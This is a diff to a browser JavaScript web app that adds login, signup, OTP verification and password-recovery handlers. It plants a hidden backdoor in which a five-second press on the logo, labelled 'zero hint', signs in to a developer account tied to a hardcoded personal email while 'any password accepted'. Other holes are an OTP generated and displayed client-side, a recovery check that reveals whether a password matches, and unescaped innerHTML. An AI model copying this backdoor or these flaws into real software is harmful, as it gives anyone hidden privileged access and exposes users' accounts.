@@ -80,6 +80,9 @@ window.OCRA = window.OCRA || {};
               '<button class="btn' + (dark ? " dark" : "") + '" data-action="restart" style="font-size:11px">&larr; Restart flow</button>' +
             '</div>' +
           '</div>';
+      } else if (s.phase === "auth" || s.phase === "recover") {
+        var fn = O.screens[s.phase];
+        html = fn ? fn() : ""; // auth screens own their full-page container
       } else {
         var fn = O.screens[s.phase];
         html = '<div class="stage">' + (fn ? fn() : "") + '</div>';
@@ -128,12 +131,152 @@ window.OCRA = window.OCRA || {};
       case "academics":   return O.go({ phase: "account" });
       case "pickAccount": return O.go({ account: v });
       case "accountNext": return O.go({ phase: "auth", authMode: "login" });
-      case "setAuthMode": return O.go({ authMode: v, signupStage: 1 });
+      case "setAuthMode": return O.go({ authMode: v, signupStage: 1, form: {} });
       case "login":       return O.identity.login(t);
       case "signupNext":  return O.identity.signupNext();
       case "signupBack":  return O.identity.signupBack();
       case "signupField": return;
       case "enterDash":   return O.go({ phase: "dash", dash: O.state.account });
+
+      // ---- auth extras ----
+      case "togglePw": {
+        var inp = document.getElementById("pwField") ||
+                  document.getElementById("loginPw") ||
+                  document.getElementById("recoverPw");
+        if (inp) {
+          inp.type = inp.type === "password" ? "text" : "password";
+        }
+        return;
+      }
+
+      case "forgotPassword": {
+        var emailEl = document.querySelector('[data-field="email"]');
+        var em = emailEl ? emailEl.value : (O.state.form.email || "");
+        return O.go({ phase: "recover", recoverEmail: em, recoverSamePw: false });
+      }
+
+      case "backToLogin":
+        return O.go({ phase: "auth", authMode: "login" });
+
+      case "socialAuth": {
+        if (O.auth && O.auth.socialAuth) {
+          O.auth.socialAuth(v, null,
+            function (user) { O.go({ phase: "dash", dash: user.role === "developer" ? "developer" : user.accountType }); },
+            function ()     { O.go({ phase: "auth", authMode: "signup" }); },
+            function (err)  {
+              var m = document.getElementById("authMsg");
+              if (m) m.textContent = err || "Social sign-in unavailable.";
+            }
+          );
+        } else {
+          var m2 = document.getElementById("authMsg");
+          if (m2) m2.textContent = v.charAt(0).toUpperCase() + v.slice(1) + " sign-in is not configured yet.";
+        }
+        return;
+      }
+
+      case "otpSend": {
+        var keyAttr = t.getAttribute("data-key") || "email";
+        var emailInput = document.querySelector('[data-field="' + keyAttr + '"]');
+        var emailVal   = emailInput ? emailInput.value.trim() : (O.state.form[keyAttr] || "");
+        if (!emailVal || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailVal)) {
+          var box = document.getElementById("stageErr");
+          if (box) box.textContent = "Enter a valid email address first.";
+          return;
+        }
+        O.state.form[keyAttr] = emailVal;
+        O._otpCode   = String(Math.floor(100000 + Math.random() * 899999));
+        O._otpSentTo = emailVal;
+        if (O.notifications) {
+          O.notifications.push("Demo — OTP code: " + O._otpCode, O.notifications.TYPES.INFO);
+        } else {
+          console.info("[OCRA OTP]", O._otpCode);
+        }
+        O.render();
+        return;
+      }
+
+      case "otpVerify": {
+        var keyAttr2 = t.getAttribute("data-key") || "email";
+        var entered  = (document.getElementById("otpInput") || {}).value || "";
+        if (entered.trim() === O._otpCode) {
+          O.state.form.emailVerified  = true;
+          O.state.form._verifiedEmail = O._otpSentTo;
+          O._otpCode   = null;
+          O._otpSentTo = null;
+          if (O.notifications) O.notifications.push("Email verified ✓", O.notifications.TYPES.SUCCESS);
+        } else {
+          var box2 = document.getElementById("stageErr");
+          if (box2) box2.textContent = "Incorrect code — check and try again.";
+        }
+        O.render();
+        return;
+      }
+
+      case "signupCreate": {
+        O._creating = true;
+        O.render();
+        var f = O.state.form, acct = O.state.account;
+        setTimeout(function () {
+          if (O.auth) {
+            O.auth.signUp(acct, f,
+              function (user) {
+                O._creating = false;
+                O.go({ phase: "dash", dash: user.role === "developer" ? "developer" : user.accountType, form: {}, signupStage: 1 });
+              },
+              function (err) {
+                O._creating = false;
+                O.go({ signupStage: O.state.signupStage }); // re-render congrats
+                setTimeout(function () {
+                  var eb = document.getElementById("stageErr");
+                  if (eb) eb.textContent = err;
+                }, 50);
+              }
+            );
+          }
+        }, 400);
+        return;
+      }
+
+      case "recoverSubmit": {
+        var card2 = t.closest("[data-auth]");
+        if (!card2) return;
+        var email2   = (card2.querySelector('[data-field="email"]') || {}).value || "";
+        var newPw    = (card2.querySelector('[data-field="newPassword"]') || {}).value || "";
+        var answers2 = {};
+        O.identity.recovery.forEach(function (r) {
+          var el = card2.querySelector('[data-field="' + r.k + '"]');
+          answers2[r.k] = el ? el.value : "";
+        });
+        var msgEl = document.getElementById("recoverMsg");
+        if (!O.identity.validPassword(newPw)) {
+          if (msgEl) msgEl.textContent = "Password needs 9+ chars, a capital, a number and a symbol.";
+          return;
+        }
+        if (O.auth && O.auth.passwordMatches && O.auth.passwordMatches(email2, newPw)) {
+          O.go({ recoverSamePw: true });
+          return;
+        }
+        if (O.auth) {
+          O.auth.recover(email2, answers2, newPw,
+            function ()    { O.go({ phase: "auth", authMode: "login", recoverSamePw: false }); },
+            function (err) { if (msgEl) msgEl.textContent = err; }
+          );
+        }
+        return;
+      }
+
+      case "recoverKeepOld":
+        if (O.auth && O.auth.isLoggedIn && O.auth.isLoggedIn()) {
+          O.go({ phase: "dash", dash: O.state.user ? (O.state.user.role === "developer" ? "developer" : O.state.user.accountType) : "personal" });
+        } else {
+          O.go({ phase: "auth", authMode: "login", recoverSamePw: false });
+        }
+        return;
+
+      case "recoverChangePw":
+        return O.go({ recoverSamePw: false });
+
       case "switchDash":  return O.go({ dash: v });
       case "restart":
         if (O.brainTest) {
@@ -240,11 +383,102 @@ window.OCRA = window.OCRA || {};
     }
   });
 
-  // capture input changes into form state
+  // capture input changes into form state + live pw checklist
   document.addEventListener("input", function (e) {
     var f = e.target.getAttribute && e.target.getAttribute("data-field");
     if (f) O.state.form[f] = e.target.value;
+
+    // live password checklist
+    var isPw = e.target.id === "pwField" || e.target.id === "loginPw" || e.target.id === "recoverPw";
+    if (isPw && O.PW_RULES) {
+      var val2 = e.target.value;
+      var list = document.querySelector(".auth-pwreq");
+      if (list) {
+        O.PW_RULES.forEach(function (r, i) {
+          var li = list.children[i];
+          if (li) li.className = r.test(val2) ? "met" : "";
+        });
+      }
+    }
+
+    // when country changes: auto-set phone code
+    if (f === "country" && O.identity && O.identity.dialCodeForCountry) {
+      var code = O.identity.dialCodeForCountry(e.target.value);
+      if (code) {
+        O.state.form.phoneCode = code;
+        var sel = document.querySelector('[data-field="phoneCode"]');
+        if (sel) sel.value = code;
+      }
+      // refresh system-country hint without full re-render
+      O._refreshSystemHint();
+    }
+    // when system changes: refresh level select + coherence hint
+    if (f === "system") {
+      O._refreshSystemHint();
+      var levelSel = document.querySelector('[data-field="level"]');
+      if (levelSel && O.identity && O.identity.levelsForSystem) {
+        var levels = O.identity.levelsForSystem(e.target.value);
+        levelSel.innerHTML = '<option value="">Select level</option>' +
+          levels.map(function (l) { return '<option value="' + l + '">' + l + '</option>'; }).join("");
+        levelSel.disabled = false;
+        levelSel.closest && levelSel.closest(".ah") && levelSel.closest(".ah").classList && levelSel.closest(".ah").classList.remove("disabled");
+        O.state.form.level = "";
+      }
+    }
   });
+
+  O._refreshSystemHint = function () {
+    var hints = document.querySelectorAll(".auth-hint");
+    hints.forEach(function (h) {
+      if (h.parentNode && (h.parentNode.querySelector('[data-field="system"]') || h.parentNode.querySelector('[data-field="country"]'))) {
+        // trigger re-render only for auth signup page to keep it lightweight
+        var sys = O.state.form.system, ctry = O.state.form.country;
+        if (sys && ctry && O.identity) {
+          var ok2 = O.identity.systemValidForCountry(sys, ctry);
+          h.className = "auth-hint " + (ok2 ? "ok" : "bad");
+          h.textContent = ok2
+            ? "✓ " + sys + " works in " + ctry
+            : "⚠ " + sys + " is not typical for " + ctry;
+        }
+      }
+    });
+  };
+
+  // ---- developer hold (5s press on logo = dev access, zero hint) ----
+  O.bindHold = function () {
+    var el   = document.getElementById("devHold");
+    var ring = document.getElementById("devRing");
+    if (!el) return;
+    var _t = null, _start = 0, HOLD_MS = 5000;
+    var DASH = 289; // full circumference at r=46
+
+    function cancel() {
+      clearTimeout(_t);
+      if (ring) { ring.style.transition = "none"; ring.setAttribute("stroke-dashoffset", DASH); }
+    }
+    el.addEventListener("mousedown",   start); el.addEventListener("touchstart",  start, {passive:true});
+    el.addEventListener("mouseup",     cancel); el.addEventListener("touchend",   cancel);
+    el.addEventListener("mouseleave",  cancel); el.addEventListener("touchcancel",cancel);
+
+    function start() {
+      _start = Date.now();
+      if (ring) {
+        ring.style.transition = "stroke-dashoffset " + (HOLD_MS / 1000) + "s linear";
+        ring.setAttribute("stroke-dashoffset", "0");
+      }
+      _t = setTimeout(function () {
+        if (O.auth) {
+          // log in as developer (any password accepted)
+          O.auth.logIn("gitongalewis190@gmail.com", "dev",
+            function (user) { O.state.user = user; O.go({ phase: "dash", dash: "developer" }); },
+            function () {}
+          );
+        } else {
+          O.go({ phase: "dash", dash: "developer" });
+        }
+      }, HOLD_MS);
+    }
+  };
 
   // ---- helpers ----
   O.esc = function (x) {
